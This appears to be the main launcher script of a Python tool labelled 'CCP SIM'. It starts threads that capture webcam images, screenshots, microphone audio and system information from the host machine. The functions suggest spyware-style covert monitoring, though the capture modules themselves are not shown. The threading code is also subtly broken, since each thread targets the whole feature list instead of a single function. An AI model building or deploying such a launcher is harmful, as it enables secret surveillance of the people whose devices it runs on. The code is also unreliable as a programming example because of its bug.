import threading

import Features.feature
from Features.feature import WEBCAMERA, SCREENSHOTS, MICROPHONE, SYS_INFO


class MainFileException(Exception):
    pass

def main():
    ascii_art = """
       _____ _____ _____     _____ _____ __  __ 
      / ____/ ____|  __ \   / ____|_   _|  \/  |
     | |   | |    | |__) | | (___   | | | \  / |
     | |   | |    |  ___/   \___ \  | | | |\/| |
     | |___| |____| |       ____) |_| |_| |  | |
      \_____\_____|_|      |_____/|_____|_|  |_|                                  
        """
    print(ascii_art)

    for i in range(5,0,-1):
        print(f"Wait: {i}")

    # List of features to run
    features = [
        WEBCAMERA.webcamera,
        SCREENSHOTS.screenshots,
        MICROPHONE.microphone,
        SYS_INFO.system_information,
        SYS_INFO.os_version
    ]

    try:
        # Create threads for each selected function
        threads = [threading.Thread(target=features) for feature in features]

        # Start the threads
        for thread in threads:
            thread.start()

        # Wait for all threads to finish
        for thread in threads:
            thread.join()

    except Exception as e:
        raise MainFileException("Main failed to run") from e

if __name__ == '__main__':
    try:
        main()
    except MainFileException as e:
        print(f"Main failed to run: {str(e)}")